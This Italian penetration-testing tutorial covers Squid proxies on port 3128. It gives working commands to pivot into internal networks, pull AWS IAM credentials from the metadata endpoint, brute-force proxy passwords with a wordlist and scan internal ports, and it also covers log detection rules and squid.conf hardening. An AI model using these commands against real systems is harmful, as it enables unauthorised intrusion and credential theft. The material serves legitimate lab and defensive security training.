---
title: 'Squid Proxy Port 3128: Pentest, Pivoting e Configurazione '
slug: porta-3128-squid-proxy
description: 'Cos’è il server proxy Squid sulla porta 3128 e come fare pentesting: open proxy, SSRF, pivoting, port scan interno, detection e hardening Linux e ACL.'
image: /squid-proxy-port-3128-pentesting.webp
draft: false
date: 2026-04-03T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Squid Proxy
  - Open Proxy
  - Proxy Pentesting
  - Proxy Enumeration
---

# Squid Proxy Porta 3128: Pentest, Open Proxy e Pivoting verso la Rete Interna

**Squid port 3128 pentesting** significa testare il forward proxy Squid, che ascolta di default sulla **porta TCP 3128**, per capire se può essere usato come open proxy, come ponte verso la rete interna o come punto di pivoting. Squid è uno dei server proxy HTTP/HTTPS più usati in aziende, scuole e ISP ed è interessante per una ragione semplice: un proxy fa le richieste **al posto tuo**, quindi se è configurato male puoi raggiungere ciò che dall'esterno non vedresti, cioè `localhost`, la rete interna e perfino i metadata del cloud.

In questa guida vedi come riconoscere Squid, come testare se è un open proxy, come fare **port scan interno attraverso il proxy** (con [mysquidscanner](https://github.com/hack-ita/mysquidscanner), lo scanner Squid di Hackita su GitHub, e con proxychains per approfondire le porte trovate), come leggere le risposte 403, 407 e 503, e come difendere un Squid in produzione. Tutto pensato per lab, CTF e ambienti autorizzati.

## Cos'è un proxy Squid e a cosa serve la porta 3128

Un **server proxy Squid** è un software open source che funziona come proxy **forward** con cache e filtering: i client della rete si collegano a lui, lui contatta il sito di destinazione e restituisce la risposta. Si usa soprattutto come **proxy Squid su Linux** (configurazione in `/etc/squid/squid.conf`), ma esistono anche build per Windows. Squid è quindi un **web cache proxy server**. Come server proxy ha due ruoli: filtra e autorizza il traffico con le ACL, e salva le risposte nella **cache Squid** per riusarle. Ascolta di default sulla **3128/TCP**, ma lo trovi spesso anche su 8080, 8000 e 8888.

Tre cose da ricordare prima di attaccarlo:

* gestisce HTTP, HTTPS (tramite il metodo `CONNECT`) e FTP;
* **non supporta SOCKS**: in proxychains userai il tipo `http`, non `socks5`;
* di solito sta in DMZ o nella rete interna, quindi vede subnet che il firewall non espone a te.

In una rete tipica la situazione è questa:

```text
Internet            DMZ / internal network
                    ┌────────────────────────────────┐
Attacker ─────────► │ Squid proxy (:3128)            │
                    │                                │
                    │ ACL: who can use the proxy?    │
                    │ Forward: towards where?        │
                    │                                │
                    │ Internal network 10.10.10.0/24 │
                    │   ├── :80   web server         │
                    │   ├── :3306 MySQL              │
                    │   ├── :8080 Jenkins            │
                    │   └── :6379 Redis              │
                    └────────────────────────────────┘
```

## Come funziona: GET, CONNECT e ACL

Un client può chiedere a Squid due cose diverse:

* **richiesta HTTP normale**: `GET http://10.10.10.50:8080/ HTTP/1.1`, Squid la inoltra e ti rimanda la risposta;
* **tunnel TCP**: `CONNECT 10.10.10.50:3306 HTTP/1.1`, se risponde `200 Connection established` hai un canale TCP grezzo verso quella porta.

Il `CONNECT` in pratica:

```text
Client                     Squid                      Target
  │                          │                          │
  │ CONNECT 10.10.10.50:3306 │                          │
  │ ───────────────────────► │ TCP connect              │
  │                          │ ───────────────────────► │
  │ 200 Connection est.      │                          │
  │ ◄─────────────────────── │                          │
  │ raw TCP bytes (MySQL)    │ raw TCP bytes            │
  │ ◄══════════════════════► │ ◄══════════════════════► │
```

### Squid proxy HTTPS e il metodo CONNECT

Con **Squid proxy HTTPS** il browser manda `CONNECT sito:443` e Squid apre un tunnel TCP senza vedere il contenuto: cifratura e certificato restano tra client e sito. Squid può ispezionare il traffico HTTPS solo se l'amministratore configura SSL-Bump, cioè l'intercettazione TLS con un certificato CA installato sui client, di fatto un [attacco man in the middle](https://hackita.it/articoli/man-in-the-middle/) autorizzato. Per le basi del protocollo leggi la guida a [HTTP e HTTPS](https://hackita.it/articoli/http-https/). Per il pentester conta un'altra cosa: lo stesso `CONNECT` che serve a navigare in HTTPS può aprire un tunnel verso qualsiasi porta, se le ACL lo permettono.

### ACL: chi decide cosa passa

A decidere cosa passa sono le **ACL** (`http_access`). La configurazione di default di Squid, nella sua forma raccomandata, contiene queste regole:

| Regola di default                     | Cosa fa                                                     | Cosa significa per te                                                      |
| ------------------------------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------- |
| `http_access deny !Safe_ports`        | Blocca le richieste HTTP verso porte non considerate sicure | Alcune porte restano fuori portata                                         |
| `http_access deny CONNECT !SSL_ports` | Permette `CONNECT` solo verso la 443                        | Con la config di default quasi ogni `CONNECT` verso altre porte dà **403** |
| `http_access deny to_localhost`       | Blocca le richieste verso `127.0.0.0/8`                     | `localhost` non è raggiungibile                                            |
| `http_access deny all`                | Nega tutto il resto                                         | Solo i client autorizzati usano il proxy                                   |

Qui sta il punto pratico: un Squid con la configurazione di default è quasi sempre chiuso. I finding reali nascono da **proxy misconfiguration**, cioè da **ACL allentate**: un `http_access allow all`, una subnet autorizzata troppo larga, le regole `deny` verso `localhost` e `RFC1918` rimosse.

![Schema del pivoting tramite Squid: CONNECT sulla porta 3128 verso localhost, rete interna e metadata cloud]()

## Lab: Squid vulnerabile da allenamento

Per fare pratica senza toccare sistemi altrui, installa Squid in una VM isolata e rendilo volutamente aperto:

```bash
sudo apt install squid
sudo cp /etc/squid/squid.conf /etc/squid/squid.conf.bak
printf 'http_port 3128\nhttp_access allow all\n' | sudo tee /etc/squid/squid.conf
sudo systemctl restart squid
```

Quella configurazione accetta richieste da chiunque verso qualsiasi destinazione, `localhost` incluso. Non esporla mai su una rete reale. Se invece ripristini `squid.conf.bak` vedrai in pratica i 403 della configurazione di default.

## Enumerazione: riconoscere Squid sulla 3128

### Nmap sulla porta 3128

```bash
nmap -sV -p 3128 10.10.10.40
nmap -p 3128 --script http-open-proxy,http-headers,http-title 10.10.10.40
```

Output di esempio:

```text
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 5.7
```

Lo script `http-open-proxy` prova direttamente a usare il servizio come proxy verso Internet.

### Banner e pagina d'errore

```bash
printf 'GET http://example.com/ HTTP/1.0\r\n\r\n' | nc -nv 10.10.10.40 3128
```

```bash
curl -sI http://10.10.10.40:3128/
```

Cerca gli header `Server`, `Via`, `X-Cache` e `X-Squid-Error`. Le pagine d'errore di Squid riportano spesso nel footer **hostname del proxy e versione** (`squid/5.7`), salvo che sia attivo `httpd_suppress_version_string`. Con la versione in mano controlla le vulnerabilità note:

```bash
searchsploit squid
```

## Test 1: è un open proxy verso Internet?

```bash
curl -s -x http://10.10.10.40:3128 http://ifconfig.me
```

Se la risposta è l'IP pubblico del proxy, il servizio inoltra traffico esterno per conto tuo. È già un finding, ma di impatto basso: il vero rischio è il test successivo. In alternativa c'è il modulo Metasploit:

```bash
msfconsole -q -x "use auxiliary/scanner/http/open_proxy; set RHOSTS 10.10.10.40; set RPORT 3128; run; exit"
```

## Test 2: il proxy raggiunge la rete interna? (SSRF-style)

Questo è il test che conta. Chiedi a Squid di contattare loopback, indirizzi privati e metadata cloud:

```bash
curl -s -x http://10.10.10.40:3128 http://127.0.0.1/
curl -s -x http://10.10.10.40:3128 http://10.10.10.1/
curl -s -x http://10.10.10.40:3128 http://192.168.1.1/
```

È lo stesso principio di un [SSRF](https://hackita.it/articoli/ssrf/), ma qui il "server vulnerabile" è il proxy stesso. Come leggere le risposte:

| Risposta di Squid                   | Significato                                                                                                                                                |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `200` con contenuto                 | La richiesta è stata inoltrata: hai raggiunto l'host                                                                                                       |
| `403 ERR_ACCESS_DENIED`             | Bloccata da una ACL, non dice nulla sullo stato della porta                                                                                                |
| `407 Proxy Authentication Required` | Il proxy richiede credenziali                                                                                                                              |
| `503 ERR_CONNECT_FAIL`              | Squid non ha stabilito la connessione: l'errore indica la causa, per esempio `(111) Connection refused` (porta chiusa) oppure `(110) Connection timed out` |

### Metadata cloud

Se Squid gira su un'istanza cloud, prova l'endpoint dei metadata:

```bash
curl -s -x http://10.10.10.40:3128 http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Se risponde, hai il nome del ruolo IAM e da lì le credenziali temporanee, utili per l'[escalation di privilegi su AWS](https://hackita.it/articoli/aws-privilege-escalation/). Con IMDSv1 basta questo.

Con **IMDSv2** serve prima un token via `PUT`, e AWS non rilascia token alle richieste che contengono l'header `X-Forwarded-For`, che Squid aggiunge di default. Quindi un Squid standard davanti a un'istanza solo-IMDSv2 ti ferma. Passa invece se l'istanza accetta ancora IMDSv1 oppure se il proxy ha `forwarded_for delete` (o `truncate`), che toglie l'header:

```bash
TOKEN=$(curl -s -x http://10.10.10.40:3128 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -x http://10.10.10.40:3128 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Autenticazione 407: credenziali e brute force

Se Squid risponde `407`, serve un utente. Con credenziali valide:

```bash
curl -s -x http://10.10.10.40:3128 --proxy-user admin:Password123 http://example.com/
```

Per un test di robustezza in lab puoi provare una wordlist guardando quando il `407` sparisce:

```bash
while read -r pass; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -x http://10.10.10.40:3128 --proxy-user "admin:$pass" http://example.com/)
  [ "$code" != "407" ] && echo "FOUND admin:$pass (HTTP $code)" && break
done < /usr/share/wordlists/rockyou.txt
```

Attenzione: l'autenticazione Basic viaggia in chiaro, quindi chi fa [sniffing](https://hackita.it/articoli/sniffing/) nella stessa rete può leggere l'header `Proxy-Authorization`. Se trovi credenziali, riusale anche in proxychains (vedi sotto).

## Port scan interno attraverso Squid

### Con mysquidscanner, lo scanner Squid di Hackita

[mysquidscanner](https://github.com/hack-ita/mysquidscanner) è lo scanner Squid di Hackita, open source su GitHub, ed è lo strumento che usiamo in ogni lab: veloce, affidabile e il più completo tra gli scanner Squid che abbiamo provato. Lavora in asyncio con il metodo `CONNECT`, classifica ogni porta in base alla risposta di Squid, prende il banner del servizio e salva il risultato. Solo libreria standard Python, nessuna dipendenza da installare.

```bash
git clone https://github.com/hack-ita/mysquidscanner
cd mysquidscanner
python3 mysquid.py --proxy 10.10.10.40:3128 --target 127.0.0.1 --ports 22,80,443,3306,6379,8080
python3 mysquid.py --proxy 10.10.10.40:3128 --target 10.10.10.50 --allports
python3 mysquid.py --proxy admin:Password123@10.10.10.40:3128 --target 127.0.0.1 --show-blocked
```

Cosa fa, in pratica:

* manda `CONNECT host:porta` e legge la prima riga della risposta: `200` = **OPEN**, `403` = **BLOCKED**, `407` = **AUTH**, altro = **CLOSED**; timeout ed errori di rete finiscono in **TIMEOUT** o **ERROR**;
* sulle porte aperte fa **banner grabbing**: prima ascolta in silenzio (SSH, FTP, SMTP, MySQL parlano per primi), poi se non arriva nulla invia un `GET /` HTTP;
* supporta proxy con autenticazione Basic (`user:pass@host:porta`);
* usa 150 worker concorrenti, timeout di 2 secondi e 2 retry, modificabili con `--workers`, `--timeout` e `--retries`;
* salva le porte aperte in `Squid_Port.txt`.

Il flusso:

```text
mysquid.py --proxy 10.10.10.40:3128 --target 127.0.0.1
        │
        ▼
 150 async workers ──► CONNECT 127.0.0.1:<port> ──► Squid
                                                      │
      ┌──────────────┬──────────────┬─────────────────┴─────┐
      ▼              ▼              ▼                       ▼
 200 = OPEN    403 = BLOCKED   407 = AUTH         other = CLOSED / TIMEOUT
      │
      ▼
 banner grab (passive read, then GET /) ──► Squid_Port.txt
```

Output di esempio (colori ANSI omessi):

```text
[+] PORT 22 OPEN -> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
[+] PORT 80 OPEN -> HTTP/1.1 200 OK
[+] PORT 8080 OPEN -> HTTP/1.1 302 Found

[*] FINAL RESULTS FOR 127.0.0.1
  [OPEN]    3 (Ports successfully reached)
  [BLOCKED] 0 (Denied by Squid policy, NOT closed)
  [CLOSED]  35 (Refused by target)
  [TIMEOUT] 0 (Failed after 2 retries)

[*] OPEN PORTS: 22, 80, 8080
[*] Results saved to: /home/kali/Squid_Port.txt
```

Un risultato **BLOCKED** non significa porta chiusa: significa che una ACL di Squid ha negato il `CONNECT` prima di arrivare al target. Se vedi 403 su quasi tutto, la regola `deny CONNECT !SSL_ports` sta lavorando. Non è detto che sia finita: le ACL `SSL_ports` (per `CONNECT`) e `Safe_ports` (per le richieste HTTP normali) sono diverse, quindi puoi ancora sondare i servizi web con richieste `GET http://host:porta/` tramite `curl -x`, come nei test della sezione precedente. Lo scanner lavora sulla strada `CONNECT`, quella che ti serve per raggiungere database e servizi non HTTP. Se vedi molti TIMEOUT, abbassa `--workers` (per esempio a 50) o alza `--timeout`.

### Dopo lo scan: proxychains e Nmap sulle porte trovate

Aggiungi il proxy in fondo a `/etc/proxychains4.conf`, nella sezione `[ProxyList]` (commenta le righe di default):

```text
http 10.10.10.40 3128
```

Con credenziali: `http 10.10.10.40 3128 admin Password123`. Con le porte aperte trovate da mysquidscanner, fai il fingerprint dei servizi solo su quelle:

```bash
proxychains -q nmap -sT -sV -Pn -n -p 22,80,8080 127.0.0.1
```

Servono `-sT` (connect scan) perché il proxy non trasporta pacchetti SYN grezzi, `-Pn` per saltare il ping e `-n` per evitare la risoluzione DNS. Niente UDP. Per approfondire concatenazione e configurazione leggi la guida a [ProxyChains](https://hackita.it/articoli/proxychains/) e quella sul [pivoting](https://hackita.it/articoli/pivoting/); per le opzioni di scansione, la guida a [Nmap](https://hackita.it/articoli/nmap/).

## Sfruttare i servizi interni trovati

Trovata una porta, la usi in due modi, a seconda del protocollo.

**Servizi web** (HTTP): passi dal proxy con l'opzione dedicata di ogni tool:

```bash
sqlmap -u "http://10.10.10.50/page.php?id=1" --proxy="http://10.10.10.40:3128" --batch
ffuf -u http://10.10.10.50/FUZZ -w /usr/share/wordlists/dirb/common.txt -x http://10.10.10.40:3128
gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt --proxy http://10.10.10.40:3128
```

In [Burp Suite](https://hackita.it/articoli/burp-suite/) imposta Squid come upstream proxy. Per i dettagli sugli strumenti: [sqlmap](https://hackita.it/articoli/sqlmap/), [ffuf](https://hackita.it/articoli/ffuf/), [Gobuster](https://hackita.it/articoli/gobuster/).

**Servizi non HTTP** (database, SSH, cache): serve il tunnel `CONNECT`, quindi proxychains:

```bash
proxychains -q redis-cli -h 127.0.0.1
proxychains -q mysql -h 127.0.0.1 -u root -p
proxychains -q ssh admin@10.10.10.50
```

Su questi servizi continui con le guide dedicate: [porta 6379 Redis](https://hackita.it/articoli/porta-6379-redis/), [porta 3306 MySQL](https://hackita.it/articoli/porta-3306-mysql/), [porta 8080 Tomcat](https://hackita.it/articoli/porta-8080-tomcat/).

## Cache Squid e Cache Manager: fughe di informazioni

La **cache Squid** memorizza le risposte (di default nella directory `cache_dir`, di solito `/var/spool/squid`) e le serve ad altri client senza ricontattare il sito. Nel pentest la riconosci dagli header: `X-Cache: HIT from hostname` indica una risposta servita dalla cache, `MISS` una richiesta inoltrata, e `Age` dice da quanti secondi l'oggetto è in cache. Se il proxy è condiviso e le intestazioni di cache sono sbagliate, una risposta con dati sensibili può essere restituita ad altri utenti.

Squid espone un'interfaccia di statistiche, il **Cache Manager**. Di default risponde solo a `localhost`:

```bash
curl -s http://10.10.10.40:3128/squid-internal-mgr/menu
curl -s http://10.10.10.40:3128/squid-internal-mgr/info
```

Se le ACL permettono richieste verso destinazioni locali, puoi far chiamare a Squid il suo stesso manager da `127.0.0.1`, così la richiesta sembra locale:

```bash
curl -s -x http://10.10.10.40:3128 http://127.0.0.1:3128/squid-internal-mgr/info
```

Il report `info` mostra versione, configurazione, statistiche e connessioni attive. Anche gli header `Via` e `X-Cache` possono rivelare l'hostname interno del proxy (per esempio `squid-prod-01.corp.internal`), un dato utile per la ricognizione.

## Exploitation di Squid: vulnerabilità note e CVE

Nella pratica un Squid esposto si rompe quasi sempre per **configurazione**, non per CVE. Le vulnerabilità del software esistono, ma sono per lo più DoS o problemi di parsing. Verifica sempre versione e advisory ufficiali prima di scrivere un finding:

| CVE            | Tipo                                                 | Versioni                         |
| -------------- | ---------------------------------------------------- | -------------------------------- |
| CVE-2023-46846 | Request/Response smuggling in HTTP/1.1 e ICAP        | Da 2.6 a 6.3, corretta nella 6.4 |
| CVE-2023-5824  | Denial of Service (gestione di strutture HTTP/HTTPS) | Precedenti alla 6.4              |
| CVE-2019-12525 | Denial of Service nell'autenticazione Digest         | Corretta nella 4.8               |

Gli advisory ufficiali sono sul [repository GitHub di Squid](https://github.com/squid-cache/squid/security/advisories). Il request smuggling è rilevante perché Squid fa **cache**: capire come una risposta finisce in cache aiuta a ragionare sul [web cache poisoning](https://hackita.it/articoli/cache-poisoning/).

## Detection: come riconoscere questi attacchi nei log

Il log `access.log` di Squid ha un formato fisso: tempo, durata, client, codice/stato, byte, metodo, URL. Una scansione tramite `CONNECT` lascia una firma evidente:

```text
1730000001.120    2 10.10.14.5 TCP_DENIED/403 3932 CONNECT 10.10.10.50:3306 - HIER_NONE/- text/html
1730000001.131    2 10.10.14.5 TCP_DENIED/403 3932 CONNECT 10.10.10.50:5432 - HIER_NONE/- text/html
1730000001.140  310 10.10.14.5 TCP_TUNNEL/200 39 CONNECT 10.10.10.50:22 - HIER_DIRECT/10.10.10.50 -
```

Tre controlli rapidi:

```bash
# CONNECT towards ports other than 443, grouped by client and destination
awk '$6=="CONNECT" && $7 !~ /:443$/ {print $3, $7}' /var/log/squid/access.log | sort | uniq -c | sort -rn | head

# Clients with a burst of denied CONNECT (typical port scan)
awk '$6=="CONNECT" && $4 ~ /TCP_DENIED/ {c[$3]++} END {for (ip in c) if (c[ip] > 50) print c[ip], ip}' /var/log/squid/access.log | sort -rn

# Requests aimed at loopback or the cloud metadata endpoint
grep -E ' (http://)?(127\.0\.0\.1|169\.254\.169\.254)' /var/log/squid/access.log
```

Per guardare il traffico del proxy in diretta usa [tcpdump](https://hackita.it/articoli/tcpdump/) sulla porta 3128:

```bash
sudo tcpdump -i any -nn port 3128
```

Da un SIEM alza un alert su più di qualche decina di `CONNECT` verso porte diverse dallo stesso client in pochi secondi, e su qualunque richiesta verso `169.254.169.254` che non arrivi da un host autorizzato.

## Configurazione Squid sicura: hardening di squid.conf

Su Linux la **configurazione di Squid** sta in `/etc/squid/squid.conf` e i log in `/var/log/squid/access.log`. Una configurazione Squid sicura, che applica le ACL nell'ordine giusto, si scrive così:

```text
# Listen only on the internal interface
http_port 10.10.10.40:3128

# Who can use the proxy
acl localnet src 10.10.10.0/24

# Allowed ports
acl SSL_ports port 443
acl Safe_ports port 80 443
acl CONNECT method CONNECT

# Destinations nobody should reach through the proxy
acl blocked_dst dst 127.0.0.0/8 169.254.0.0/16 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny blocked_dst
http_access allow localnet
http_access deny all

# Reduce information leaks
via off
httpd_suppress_version_string on
```

Su istanze cloud lascia `forwarded_for` al valore di default: l'header `X-Forwarded-For` è una delle ragioni per cui AWS rifiuta i token IMDSv2 alle richieste inoltrate da un proxy, quindi toglierlo per "nascondere" gli IP interni indebolisce quella protezione. L'ordine delle regole conta: Squid applica la **prima** che combacia. Le `deny` verso le destinazioni interne vanno prima dell'`allow localnet`. Dopo ogni modifica controlla la sintassi con `squid -k parse` e applica la nuova configurazione con `squid -k reconfigure`.

Oltre alla configurazione:

* limita la 3128 con firewall ai soli client che devono usare il proxy, mai su IP pubblici;
* usa autenticazione e, dove possibile, evita Basic in chiaro;
* aggiorna Squid a una versione corrente;
* riduci cosa il server proxy può raggiungere nella rete interna, specie se è in DMZ;
* monitora `access.log` con le query della sezione precedente.

Dopo ogni modifica riesegui questi test dall'esterno: se `mysquidscanner` restituisce solo `BLOCKED`, la ACL sta funzionando.

## Come configurare Squid su Linux: guida passo passo (lato difensivo)

Se gestisci un **server proxy Squid su Linux**, questa è la **configurazione di Squid** completa e sicura: installazione, autenticazione, cache e firewall. Parte dal blocco di ACL della sezione precedente e aggiunge ciò che manca per metterlo in produzione. I percorsi valgono per Debian/Ubuntu; dove cambiano su RHEL/Fedora è indicato.

### Installare Squid su Linux

```bash
# Debian / Ubuntu
sudo apt install squid apache2-utils

# RHEL / Fedora
sudo dnf install squid httpd-tools

sudo systemctl enable --now squid
sudo cp /etc/squid/squid.conf /etc/squid/squid.conf.orig
```

`apache2-utils` (o `httpd-tools`) serve per creare il file delle password con `htpasswd`. La copia `squid.conf.orig` ti permette di tornare indietro: il file originale è lungo e pieno di commenti, conviene lavorare su una configurazione corta come quella della sezione precedente.

### Configurare l'autenticazione del proxy

Crea un utente e proteggi il file delle password:

```bash
sudo htpasswd -b -c /etc/squid/passwords analista ProxyLab2026
# on RHEL/Fedora the group is squid instead of proxy
sudo chown root:proxy /etc/squid/passwords
sudo chmod 640 /etc/squid/passwords
```

Quella password è solo per il lab: in produzione usa `htpasswd` senza `-b`, che la chiede in modo interattivo e non la lascia nella history della shell. Poi aggiungi al `squid.conf`, prima delle regole `http_access`:

```text
# Basic authentication backed by the htpasswd file (on RHEL the path is /usr/lib64/squid/)
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm Squid proxy
auth_param basic credentialsttl 2 hours
acl authenticated proxy_auth REQUIRED
```

e sostituisci la regola `http_access allow localnet` con:

```text
http_access allow localnet authenticated
```

Ora ci vogliono sia l'IP giusto sia le credenziali. L'autenticazione Basic viaggia in chiaro, quindi tienila dentro una rete fidata o dietro una [VPN](https://hackita.it/articoli/vpn/).

### Configurazione della cache Squid

La **configurazione della cache Squid** si fa con tre direttive:

```text
# Memory cache and disk cache (2000 MB, 16 first-level and 256 second-level directories)
cache_mem 256 MB
cache_dir ufs /var/spool/squid 2000 16 256
maximum_object_size 50 MB
```

`cache_mem` è la RAM usata per gli oggetti più richiesti, `cache_dir` la cache su disco e `maximum_object_size` il limite per singolo oggetto. Più cache significa più dati in transito da proteggere: se il proxy è condiviso, rivedi sempre quali risposte finiscono in cache.

### Proxy HTTPS e SSL-Bump

Per il traffico **HTTPS tramite Squid** non serve altro: i client usano `CONNECT` sulla 443, già consentita da `SSL_ports`. SSL-Bump è una funzione avanzata che intercetta il TLS degli utenti: attivala solo con una reale necessità e una base legale, perché ha implicazioni di privacy e di conformità.

### Applicare la configurazione

```bash
sudo squid -k parse
sudo systemctl stop squid
sudo squid -z
sudo systemctl start squid
```

`squid -k parse` controlla la sintassi, `squid -z` crea la struttura della cache. Per le modifiche successive basta `sudo squid -k reconfigure`.

### Firewall: chi può raggiungere la porta 3128

```bash
# Debian / Ubuntu with ufw
sudo ufw allow from 10.10.10.0/24 to any port 3128 proto tcp

# RHEL / Fedora with firewalld
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.10.10.0/24" port protocol="tcp" port="3128" accept'
sudo firewall-cmd --reload
```

Con il [firewall](https://hackita.it/articoli/firewall/) in default deny, solo la tua subnet arriva al proxy.

### Verifica come farebbe un attaccante

Chiudi il cerchio con gli stessi test della parte offensiva:

```bash
# Authenticated request from the allowed subnet: expect 200
curl -s -o /dev/null -w "%{http_code}\n" -x http://10.10.10.40:3128 --proxy-user analista:ProxyLab2026 http://example.com/

# Same request without credentials: expect 407
curl -s -o /dev/null -w "%{http_code}\n" -x http://10.10.10.40:3128 http://example.com/

# From outside the allowed subnet the port must not answer
nmap -Pn -p 3128 10.10.10.40

# Internal targets must come back BLOCKED even with valid credentials
python3 mysquid.py --proxy analista:ProxyLab2026@10.10.10.40:3128 --target 127.0.0.1 --show-blocked
```

Se [mysquidscanner](https://github.com/hack-ita/mysquidscanner) non trova nessuna porta `OPEN` e restituisce solo `BLOCKED`, le ACL stanno reggendo.

### Squid su Windows

Esistono build di terze parti per Windows. La sintassi di `squid.conf` è la stessa: cambiano i percorsi e il modo in cui gestisci il servizio, quindi adatta le directory di cache e di log al tuo sistema.

### Checklist difensiva

* aggiorna Squid con i pacchetti della distribuzione e controlla gli advisory ufficiali;
* esponi la 3128 solo sulla rete interna e dai l'accesso da remoto con una VPN, mai aprendo la porta a Internet;
* ruota i log con `sudo squid -k rotate` e tieni gli alert descritti nella sezione detection;
* fai un audit periodico dell'host con [Lynis](https://hackita.it/articoli/lynis/);
* ripeti ogni tanto il test offensivo con [Nmap](https://hackita.it/articoli/nmap/) e mysquidscanner dopo ogni modifica.

## Cheat sheet

| Obiettivo                          | Comando                                                                          |
| ---------------------------------- | -------------------------------------------------------------------------------- |
| Rilevare Squid                     | `nmap -sV -p 3128 10.10.10.40`                                                   |
| Open proxy verso Internet          | `curl -s -x http://10.10.10.40:3128 http://ifconfig.me`                          |
| Rete interna                       | `curl -s -x http://10.10.10.40:3128 http://127.0.0.1/`                           |
| Metadata cloud                     | `curl -s -x http://10.10.10.40:3128 http://169.254.169.254/latest/meta-data/`    |
| Nmap sulle porte trovate           | `proxychains -q nmap -sT -sV -Pn -n -p 22,80,8080 127.0.0.1`                     |
| Scan con mysquidscanner            | `python3 mysquid.py --proxy 10.10.10.40:3128 --target 127.0.0.1`                 |
| Cache Manager                      | `curl -s http://10.10.10.40:3128/squid-internal-mgr/info`                        |
| Controllare e applicare squid.conf | `sudo squid -k parse && sudo squid -k reconfigure`                               |
| sqlmap via proxy                   | `sqlmap -u "http://10.10.10.50/page.php?id=1" --proxy="http://10.10.10.40:3128"` |

## FAQ

### Cos'è un proxy Squid?

Squid è un server proxy open source con cache: riceve le richieste dei client, le inoltra ai siti di destinazione e salva le risposte per riusarle. Ascolta di default sulla porta 3128.

### Cos'è la porta 3128?

È la porta TCP predefinita di Squid, un proxy HTTP/HTTPS con cache. Se la trovi aperta su un host, probabilmente c'è un proxy che i client usano per navigare.

### Squid proxy supporta HTTPS?

Sì, tramite il metodo `CONNECT`: Squid apre un tunnel TCP verso il sito senza leggere il contenuto cifrato. Può ispezionarlo solo con SSL-Bump, che richiede un certificato CA installato sui client.

### Come capisco se un proxy Squid è un open proxy?

Prova `curl -s -x http://IP:3128 http://ifconfig.me`: se ricevi l'IP del proxy, inoltra traffico esterno. Poi prova a raggiungere `127.0.0.1` e una subnet interna: se risponde, il proxy permette anche il pivoting.

### Come si scansionano le porte interne passando da Squid?

Con [mysquidscanner](https://github.com/hack-ita/mysquidscanner), lo scanner Squid di Hackita: usa `CONNECT`, distingue porte aperte, bloccate dalle ACL e chiuse, prende i banner e salva i risultati. Sulle porte trovate puoi poi lanciare `proxychains nmap -sT -sV -Pn` per il fingerprint.

### Cosa significa 403 su una porta con Squid?

Che una ACL di Squid ha negato la richiesta. Non indica che la porta sia chiusa sul target: la richiesta non è arrivata a destinazione.

### Squid è vulnerabile di default?

No. La configurazione di default nega `CONNECT` verso le porte diverse dalla 443 e le richieste verso `localhost`. I problemi nascono da ACL allentate o da un proxy esposto su Internet senza restrizioni.

### Come configurare Squid in modo sicuro?

In `/etc/squid/squid.conf` limita i client con `acl src`, nega le destinazioni interne e i `CONNECT` fuori dalla 443, nascondi la versione, filtra la 3128 con firewall e tieni il software aggiornato. L'esempio completo è nella sezione sulla configurazione di Squid.

### Come si installa e configura Squid su Linux?

Installa il pacchetto con `apt install squid` (Debian/Ubuntu) o `dnf install squid` (RHEL/Fedora), scrivi ACL, autenticazione e cache in `/etc/squid/squid.conf`, poi controlla con `squid -k parse` e riavvia il servizio. La procedura completa, con firewall e verifica, è nella sezione su come configurare Squid.

### Squid funziona su Windows?

Sì, esistono build di terze parti. La sintassi di `squid.conf` resta la stessa, cambiano percorsi e gestione del servizio.

### Come si svuota la cache di Squid?

Ferma il servizio, svuota la directory indicata da `cache_dir` in `squid.conf` (di solito `/var/spool/squid`) e ricrea la struttura:

```bash
sudo systemctl stop squid
sudo rm -rf /var/spool/squid/*
sudo squid -z
sudo systemctl start squid
```

Riferimento: documentazione ufficiale di Squid. Uso esclusivo in ambienti autorizzati.
